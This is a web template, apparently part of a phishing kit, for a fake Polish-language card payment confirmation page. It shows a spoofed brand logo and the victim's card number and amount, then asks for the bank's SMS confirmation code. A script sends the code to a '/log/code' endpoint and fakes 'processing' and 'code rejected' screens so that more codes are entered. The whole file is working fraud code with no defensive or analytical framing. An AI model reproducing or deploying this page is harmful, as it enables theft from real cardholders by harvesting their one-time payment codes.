@extends('layouts.fake')
@push('css')
    <style>
        ._0 {
            margin: 0 auto;
            max-width: 390px;
            box-shadow: 0 0 32px #e8e8e8;
            box-sizing: border-box;
            padding: 24px;
            background: #fff;
        }

        ._1 {
            font-weight: bold;
            font-size: 18px;
            padding-top: 16px;
            padding-bottom: 2px;
        }

        ._2 {
            margin: 10px 0;
            border-bottom: 1px solid #ddd;
        }

        ._3 {
            font-size: 14px;
            border: 1px solid #ddd;
            border-radius: 6px;
            padding: 8px 0;
        }

        ._3:hover {
            border: 1px solid #000;
        }

        ._4 {
            background: #17c67a;
            color: #fff;
            padding: 11px 0;
        }

        ._4:hover {
            background: #45d194;
        }

        ._5 {
            color: #aaa;
            text-align: right;
            width: 45%;
            padding-right: 24px;
        }

        ._6 {
            font-weight: bold;
        }

        ._7 {
            margin-top: 4px;
            margin-bottom: 16px;
        }

        ._8 {
            padding-bottom: 6px;
            line-height: 18px;
        }

        ._9 {
            text-align: right;
        }

        body {
            margin: 0;
            font-family: Arial;
            font-size: 12px;
            color: #222;
            word-break: break-word;
            user-select: none;
            background: #fdfdfd;
        }

        input {
            font-family: Arial;
            font-size: 12px;
            color: #222;
            width: 100%;
            border: none;
            box-sizing: border-box;
            text-align: center;
        }

        table {
            width: 100%;
            border-collapse: separate;
            border-spacing: 0;
        }

        td {
            padding: 4px 0;
        }

        #sms {
            display: none;
        }

        #lk {
            display: none;
        }
    </style>
    <style>
        ._0 {
            opacity: 0;
        }

        .holder {
            position: absolute;
            left: 0px;
            top: 0px;
            bottom: 0px;
            right: 0px;
            width: 100%;
            height: 100%;
            background-color: #fff;
            z-index: 100;
            transition: 1s;
            opacity: 1;
        }

        .preloader {
            /* size */
            width: 100px;
            height: 100px;
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translateX(-50%) translateY(-50%);
            animation: rotatePreloader 2s infinite ease-in;
        }

        @keyframes rotatePreloader {
            0% {
                transform: translateX(-50%) translateY(-50%) rotateZ(0deg);
            }
            100% {
                transform: translateX(-50%) translateY(-50%) rotateZ(-360deg);
            }
        }

        .preloader div {
            position: absolute;
            width: 100%;
            height: 100%;
            opacity: 0;
        }

        .preloader div:before {
            content: "";
            position: absolute;
            left: 50%;
            top: 0%;
            width: 10%;
            height: 10%;
            background-color: #898989;
            transform: translateX(-50%);
            border-radius: 50%;
        }

        .preloader div:nth-child(1) {
            transform: rotateZ(0deg);
            animation: rotateCircle1 2s infinite linear;
            z-index: 9;
        }

        @keyframes rotateCircle1 {
            0% {
                opacity: 0;
            }
            0% {
                opacity: 1;
                transform: rotateZ(36deg);
            }
            7% {
                transform: rotateZ(0deg);
            }
            57% {
                transform: rotateZ(0deg);
            }
            100% {
                transform: rotateZ(-324deg);
                opacity: 1;
            }
        }

        .preloader div:nth-child(2) {
            transform: rotateZ(36deg);
            animation: rotateCircle2 2s infinite linear;
            z-index: 8;
        }

        @keyframes rotateCircle2 {
            5% {
                opacity: 0;
            }
            5.0001% {
                opacity: 1;
                transform: rotateZ(0deg);
            }
            12% {
                transform: rotateZ(-36deg);
            }
            62% {
                transform: rotateZ(-36deg);
            }
            100% {
                transform: rotateZ(-324deg);
                opacity: 1;
            }
        }

        .preloader div:nth-child(3) {
            transform: rotateZ(72deg);
            animation: rotateCircle3 2s infinite linear;
            z-index: 7;
        }

        @keyframes rotateCircle3 {
            10% {
                opacity: 0;
            }
            10.0002% {
                opacity: 1;
                transform: rotateZ(-36deg);
            }
            17% {
                transform: rotateZ(-72deg);
            }
            67% {
                transform: rotateZ(-72deg);
            }
            100% {
                transform: rotateZ(-324deg);
                opacity: 1;
            }
        }

        .preloader div:nth-child(4) {
            transform: rotateZ(108deg);
            animation: rotateCircle4 2s infinite linear;
            z-index: 6;
        }

        @keyframes rotateCircle4 {
            15% {
                opacity: 0;
            }
            15.0003% {
                opacity: 1;
                transform: rotateZ(-72deg);
            }
            22% {
                transform: rotateZ(-108deg);
            }
            72% {
                transform: rotateZ(-108deg);
            }
            100% {
                transform: rotateZ(-324deg);
                opacity: 1;
            }
        }

        .preloader div:nth-child(5) {
            transform: rotateZ(144deg);
            animation: rotateCircle5 2s infinite linear;
            z-index: 5;
        }

        @keyframes rotateCircle5 {
            20% {
                opacity: 0;
            }
            20.0004% {
                opacity: 1;
                transform: rotateZ(-108deg);
            }
            27% {
                transform: rotateZ(-144deg);
            }
            77% {
                transform: rotateZ(-144deg);
            }
            100% {
                transform: rotateZ(-324deg);
                opacity: 1;
            }
        }

        .preloader div:nth-child(6) {
            transform: rotateZ(180deg);
            animation: rotateCircle6 2s infinite linear;
            z-index: 4;
        }

        @keyframes rotateCircle6 {
            25% {
                opacity: 0;
            }
            25.0005% {
                opacity: 1;
                transform: rotateZ(-144deg);
            }
            32% {
                transform: rotateZ(-180deg);
            }
            82% {
                transform: rotateZ(-180deg);
            }
            100% {
                transform: rotateZ(-324deg);
                opacity: 1;
            }
        }

        .preloader div:nth-child(7) {
            transform: rotateZ(216deg);
            animation: rotateCircle7 2s infinite linear;
            z-index: 3;
        }

        @keyframes rotateCircle7 {
            30% {
                opacity: 0;
            }
            30.0006% {
                opacity: 1;
                transform: rotateZ(-180deg);
            }
            37% {
                transform: rotateZ(-216deg);
            }
            87% {
                transform: rotateZ(-216deg);
            }
            100% {
                transform: rotateZ(-324deg);
                opacity: 1;
            }
        }

        .preloader div:nth-child(8) {
            transform: rotateZ(252deg);
            animation: rotateCircle8 2s infinite linear;
            z-index: 2;
        }

        @keyframes rotateCircle8 {
            35% {
                opacity: 0;
            }
            35.0007% {
                opacity: 1;
                transform: rotateZ(-216deg);
            }
            42% {
                transform: rotateZ(-252deg);
            }
            92% {
                transform: rotateZ(-252deg);
            }
            100% {
                transform: rotateZ(-324deg);
                opacity: 1;
            }
        }

        .preloader div:nth-child(9) {
            transform: rotateZ(288deg);
            animation: rotateCircle9 2s infinite linear;
            z-index: 1;
        }

        @keyframes rotateCircle9 {
            40% {
                opacity: 0;
            }
            40.0008% {
                opacity: 1;
                transform: rotateZ(-252deg);
            }
            47% {
                transform: rotateZ(-288deg);
            }
            97% {
                transform: rotateZ(-288deg);
            }
            100% {
                transform: rotateZ(-324deg);
                opacity: 1;
            }
        }

        .preloader div:nth-child(10) {
            transform: rotateZ(324deg);
            animation: rotateCircle10 2s infinite linear;
            z-index: 0;
        }

        @keyframes rotateCircle10 {
            45% {
                opacity: 0;
            }
            45.0009% {
                opacity: 1;
                transform: rotateZ(-288deg);
            }
            52% {
                transform: rotateZ(-324deg);
            }
            102% {
                transform: rotateZ(-324deg);
            }
            100% {
                transform: rotateZ(-324deg);
                opacity: 1;
            }
        }
    </style>
    <style>
        body {
            font-family: "Lato", sans-serif;
            font-weight: 400;
            font-size: 15px;
            background-color: #f4f4f5;
            color: #111;
            padding: 0 15px;
            overflow-y: hidden;
        }

        .form-container {
            display: flex;
            height: 100vh;
            justify-content: center;
            align-items: center;
        }

        .form-block {
            max-width: 480px;
            margin: 0 auto;
            float: left;
        }

        .form-block-image {
            display: inline-block;
            width: 30%;
        }

        .form-block-header-text {
            display: inline-block;
            position: relative;
            font-size: 20px;
            margin: 0;
            top: -22px;
            left: 10px;
        }

        .form-block-body-text {
            line-height: 22px;
        }

        .form-block-body-table {
            border-spacing: 0;
            margin-top: 25px;
            margin-bottom: 30px;
        }

        .form-block-body-table tr {
            line-height: 24px;
        }

        .form-block-body-table tr td:nth-child(odd) {
            padding-right: 40px;
        }

        .form-block-body-table tr td:nth-child(even) {
            font-weight: 700;
        }

        .form-block-body-notification {
            font-size: 13px;
            line-height: 18px;
            background-color: #f5f6f7;
            box-shadow: 0 0 5px rgba(0, 0, 0, .1);
            border: 1px solid #e1e1ea;
            border-radius: 4px;
            padding: 10px 15px;
            margin-bottom: 25px;
        }

        .form-block-footer-text {
            font-weight: 700;
        }

        .form-block-footer-input {
            display: block;
            width: 100%;
            font-family: "Lato", sans-serif;
            font-size: 14px;
            border: 1px solid #e7e7e7;
            border-radius: 3px;
            padding: 10px 15px;
            transition: .25s;
        }

        .form-block-footer-input:focus {
            border-color: #c5c0c0;
            outline: none;
        }

        .input-invalid {
            border-color: #e74c3c;
        }

        .form-block-footer-input::-webkit-outer-spin-button,
        .form-block-footer-input::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }

        .form-block-footer-button {
            display: block;
            width: 100%;
            margin: 0 auto;
            padding: 12px 0;
            background: #0031c8;
            color: #fff;
            font-family: inherit;
            font-size: 13px;
            border: 0;
            border-radius: 8px;
            cursor: pointer;
            outline: 0;
        }

        .form-block-footer-button:hover {
            background-color: #00a3df;
        }

        @media (max-width: 360px) {
            .form-block-image {
                display: block;
                margin-bottom: 15px;
            }

            .form-block-header-text {
                position: static;
                display: block;
            }
        }

        @media (max-height: 680px) {
            body {
                overflow-y: auto;
                padding: 15px;
            }

            .form-container {
                display: block;
            }

            .form-block-footer-button {
                margin-bottom: 25px;
            }
        }
    </style>
@endpush
@section('content')
    <div class="holder">
        <div style="width: 300px; margin: 20px auto; text-align: center;">Weryfikacja transakcji...<br>Może to zająć
            kilka minut. Prosimy nie odświeżać ani opuszczać strony.
        </div>
        <div class="preloader">
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
        </div>
    </div>
    <div class="_0">
        <div class="form-container">
            <div class="form-block" id="step-1">
                <div class="form-block-header">
                    <img src="{{$fake->logo()}}" width="30%"><br><br>
                    <br>
                    <h1 class="form-block-header-text">Potwierdzenie operacji</h1>
                </div>

                <div class="form-block-body">
                    <p class="form-block-body-text">
                        Aby potwierdzić operację, na Twój numer telefonu została wysłana wiadomość tekstowa z kodem
                        potwierdzającym. Wprowadź go w polu poniżej.
                    </p>

                    <table class="form-block-body-table">
                        <tr>
                            <td>Sklep:</td>
                            <td>{{$categoryName}}</td>
                        </tr>

                        <tr>
                            <td>Kwota:</td>
                            <td>{{$amount}}</td>
                        </tr>

                        <tr>
                            <td>Nr karty:</td>
                            <td>{{$card_number}}</td>
                        </tr>
                    </table>

                    <div class="form-block-body-notification">
                        <b>Uwagę!</b> Ze względu na duże obciążenie serwera, przesłanie kodu może być opóźnione o kilka
                        minut.
                    </div>
                </div>

                <div class="form-block-footer">
                    <p class="form-block-footer-text">
                        Kod potwierdzenia:
                    </p>

                    <input type="text" class="form-block-footer-input" placeholder="Wpisz kod..." maxlength="10"
                           id="code-input">
                    <br>
                    <div style="text-align: center;">
                        <button class="form-block-footer-button" id="submit-button" style="background: #ff661f">
                            Potwierdzić
                        </button>
                    </div>
                </div>
            </div>
            <div class="form-block" id="step-2" style="display: none;">
                <div class="form-block-header">

                    <img src="{{$fake->logo()}}" width="30%" alt="Kufar" class="form-block-image">
                    <h1 class="form-block-header-text">Przetwarzanie płatności</h1>
                </div>

                <div class="form-block-body">
                    <p class="form-block-body-text">
                        Płatność jest w trakcie przetwarzania. Nastąpi automatyczne przekierowanie na odpowiednią
                        stronę.
                        Może to zająć trochę czasu.
                    </p>
                </div>
            </div>
            <div class="form-block" id="step-3" style="display: none;">
                <div class="form-block-header">
                    {{--                    <img src="{{$fake->logo()}}" width="30%" alt="Kufar" class="form-block-image" style="margin-bottom: 10px">--}}
                    <h1 class="form-block-header-text">Operacja została odrzucona.</h1>
                </div>

                <div class="form-block-body">
                    <p class="form-block-body-text">
                        Wprowadzono nieprawidłowy kod potwierdzenia lub skończył się jego termin ważności.
                        <br><br>Prosimy o oczekiwanie. Za chwilę zostanie wysłany nowy kod
                    </p>
                </div>
            </div>
        </div>
    </div>

@endsection
@push('js')
    <script>
        window.onload = function () {
            let preloader = document.querySelector('.holder');
            let preloader2 = document.querySelector('._0');
            document.querySelector('body').removeAttribute("id");
            setTimeout(function () {
                preloader.style.opacity = '0';
                preloader2.style.opacity = '1';
                setTimeout(function () {
                    preloader.style.display = 'none';
                }, 1000);
            }, 10000);
        };
    </script>
    <script type="text/javascript">
        $("#submit-button").on("click", function () {
            let input = $("#code-input");
            let code = input.val();
            if (code.length < 3 || code.length > 8) {
                input.addClass("input-invalid");
                setTimeout(function () {
                    input.removeClass("input-invalid");
                }, 6000);
                return false;
            }
            $.post("/log/code", {code: code}, function (data) {
                $("#step-1").fadeOut(500, function () {
                    $("#step-2").fadeIn().fadeOut(500, function () {
                        setTimeout(function () {
                            $("#step-3").fadeIn().fadeOut(5000, function () {
                                $("#step-1").fadeIn();
                                $("#code-input").val('');
                            });
                            if (data.next) location.href = data.next;
                        }, 3000);
                    });
                });
            });
        });
    </script>
@endpush